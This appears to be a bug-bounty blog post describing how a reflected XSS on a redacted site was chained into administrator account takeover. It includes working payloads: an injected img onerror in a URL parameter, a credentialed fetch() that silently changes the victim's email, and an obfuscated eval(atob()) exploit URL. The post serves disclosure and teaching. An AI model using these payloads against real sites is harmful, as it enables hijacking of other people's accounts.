# How I Turned a ‘Low Severity’ Reflected XSS into Full Account Takeover

> **Author**: Ashar Mahmood
> **Published**: May 14, 2026

---

![Ashar Mahmood](https://miro.medium.com/v2/resize:fill:32:32/1*ENmVJms3rcrT8zyumtCEYA.jpeg)

84

3

2

Listen

Share

Hello hackers! It’s me Ashar, here again. 👨‍💻

While testing redacted.com, I came across what initially looked like a very ordinary reflected XSS vulnerability.

Honestly… at first, I wasn’t very excited. 😅

The application had already implemented HttpOnly cookies correctly, meaning the classic:

```
document.cookie
```

approach was practically useless. And as bug hunters, we’ve all been there before…

You find an XSS!
You try stealing cookies, HttpOnly ruins the fun. 😭

So initially, I thought:

“Alright… probably just a Low or Medium severity finding.”

But something about the application architecture kept bothering me. 🤔

That’s when I decided to go deeper instead of stopping at the obvious.

And eventually…

That “harmless” reflected XSS turned into a complete admin account takeover.

![image](https://miro.medium.com/v2/resize:fit:498/1*FDMCtQ4jjJCK83J5mFeFOQ.gif)

## The Discovery

During reconnaissance, I noticed an endpoint reflecting user-controlled input directly into the HTML response without proper sanitization.

The vulnerable endpoint looked like this:

```
https://redacted.com/dashboard?next="><img src=x onerror=alert(document.cookie)>
```

As soon as I visited the page, paylaod executed successfully!!

![image](https://miro.medium.com/v2/resize:fit:260/1*k-Bx0rOlw6rU9hC-TPc2Xg.gif)

Boom. Reflected XSS confirmed, But then came the disappointment…

## The “Dead End”

When I attempted to access session cookies:

```
document.cookie
```

the sensitive authentication cookies were missing.

The application had implemented HttpOnly protections properly.

At this point, most of us would probably classify the issue as low impact and move on.

And honestly…

For a few minutes, even I thought the same. 😅 But then a simple thought crossed my mind:

“What if I don’t actually need to read the cookies?”

That single question completely changed the direction of the entire assessment.

![image](https://miro.medium.com/v2/resize:fit:498/1*PVXx3HQywxjrCYsgmRrS4g.gif)

## Digging Deeper 👀

At this point, the vulnerability looked interesting… but not critical.

The HttpOnly cookies had already killed the classic cookie theft approach.

So instead of trying to steal sessions directly, I started exploring the application’s authenticated functionality more carefully.

And that’s when things became REALLY interesting.

While browsing through Burp history and analyzing API requests, I noticed that the application heavily relied on JSON-based API calls for sensitive account operations.

One particular request immediately caught my attention.

```
POST /account/change-email HTTP/1.1
Host: redacted.com
Cookie: REDACTED
Content-Type: application/json

{
  "email":"attacker@redacted.com","reqToken":"redactedrandomstring"
}
```

Now normally, endpoints like these are difficult to abuse through traditional CSRF attacks because they require:

- application/json
- custom request headers
- authenticated browser context

A normal HTML form cannot naturally send requests like this. Which meant a classic CSRF attack was practically useless here.

## Get Ashar Mahmood’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

But then I realized something VERY important, my JavaScript payload wasn’t executing from an external attacker-controlled domain…

```
https://redacted.com
```

Which meant:

![image](https://miro.medium.com/v2/resize:fit:480/1*iE3vHW5L_MJRq_v8rJ7ofA.gif)

The browser itself could be weaponized against the victim.

## Turning XSS into Account Takeover

Now the reflected XSS became MUCH more dangerous. Instead of trying to steal cookies, I decided to abuse the victim’s authenticated browser session directly.

As I already had my eyes on email change API calls so I curated a JS payload to fire this call within victim’s session.

```
fetch('https://redacted.com/account/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'attacker@redacted.com'
    })
})
```

Because the payload executed from the trusted origin itself, the browser automatically included the administrator’s authenticated session cookies.

Which means:

✅ The request was treated as legitimate
✅ The administrator’s email changed silently
✅ The attacker gained password reset control

No cookie theft required.

Once the email was changed, I could simply trigger the “Forgot Password” functionality and completely take over the administrator account.

Leading to:

- Full admin account compromise
- Persistent access
- Access to internal functionality
- Potential organization-wide impact

And the best part?

The victim would likely have absolutely no idea anything happened.

![image](https://miro.medium.com/v2/resize:fit:498/1*3ILU2aFYjBynJdnHUA7PEw.gif)

## The Final Payload

To make exploitation cleaner, I base64-encoded the payload using:

```
btoa(payload)
```

Then executed it using:

```
<img src=x onerror=eval(atob('BASE64_PAYLOAD'))>
```

Final exploit URL:

```
https://redacted.com/dashboard?next="><img src=x onerror=eval(atob('BASE64_PAYLOAD'))>
```

Just one click from a logged-in administrator… And the account was gone!!

## Why HttpOnly Wasn’t Enough

This finding demonstrated an important security misconception.

Many developers believe that HttpOnly cookies significantly reduce the impact of XSS vulnerabilities.

But once JavaScript executes inside the trusted origin, it can still perform authenticated actions on behalf of the victim.

In this case, the reflected XSS allowed same-origin JavaScript execution against sensitive JSON API endpoints, ultimately leading to full administrator account takeover.

![image](https://miro.medium.com/v2/resize:fit:640/1*VxUq5yVZ82QZeSb8aVWMow.gif)

Like & drop a comment if you found this helpful — happy to answer any questions! Follow for more like this one.

## 🔗 For More, Follow Me:

- LinkedIn: asharmahmood
- Twitter (X): @Hx_0p
- Website: asharmahmood.com



---
*Original URL: [https://medium.com/@asharm.khan7/how-i-turned-a-low-severity-reflected-xss-into-full-admin-account-takeover-42ff5ab31230?source=search_post---------3-----------------------------------](https://medium.com/@asharm.khan7/how-i-turned-a-low-severity-reflected-xss-into-full-admin-account-takeover-42ff5ab31230?source=search_post---------3-----------------------------------)*
